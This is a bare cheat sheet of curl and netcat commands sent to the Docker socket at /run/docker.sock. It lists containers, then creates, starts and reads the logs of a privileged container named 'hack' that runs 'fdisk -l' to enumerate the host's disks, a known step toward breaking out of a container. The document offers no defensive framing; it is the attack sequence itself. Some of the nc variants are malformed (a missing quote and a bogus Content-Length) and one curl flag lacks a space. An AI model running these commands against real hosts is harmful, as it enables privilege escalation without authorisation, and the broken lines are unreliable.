# List
curl --silent -XGET --unix-socket /run/docker.sock -H 'Content-Type: application/json' http://localhost/containers/json | jq .

echo -e "GET /containers/json HTTP/1.0\r\n" | nc local:/run/docker.sock

# Create
curl --silent -XPOST --unix-socket /run/docker.sock -d '{"Image":"alpine:3.15.0", "HostConfig": {"Privileged": true}, "Cmd": [ "fdisk", "-l" ] }' -H 'Content-Type: application/json' http://localhost/containers/create?name=hack

echo -e "POST /containers/create?name=hack HTTP/1.0\r\nContent-Type: application/json\r\nContent-Length: 12345\r\n\r\n{\"Image\":\"alpine:3.15.0\",
\"HostConfig\":{\"Privileged\":true},\"Cmd\": [fdisk\",-l\" ]}" | nc local:/run/docker.sock
# Start
curl --silent -XPOST --unix-socket /run/docker.sock -H 'Content-Type: application/json' http://localhost/containers/hack/start?stdout=true

echo -e "POST /containers/hack/start?stdout=true HTTP/1.0\r\n\r\n" | nc local:/run/docker.sock

# Logs
curl --verbose--output - -XGET --unix-socket /run/docker.sock -H 'Content-Type: application/json' http://localhost/containers/hack/logs?stdout=true 

echo -e "GET /containers/hack/logs?stdout=true HTTP/1.0\r\n" | nc local:/run/docker.sock
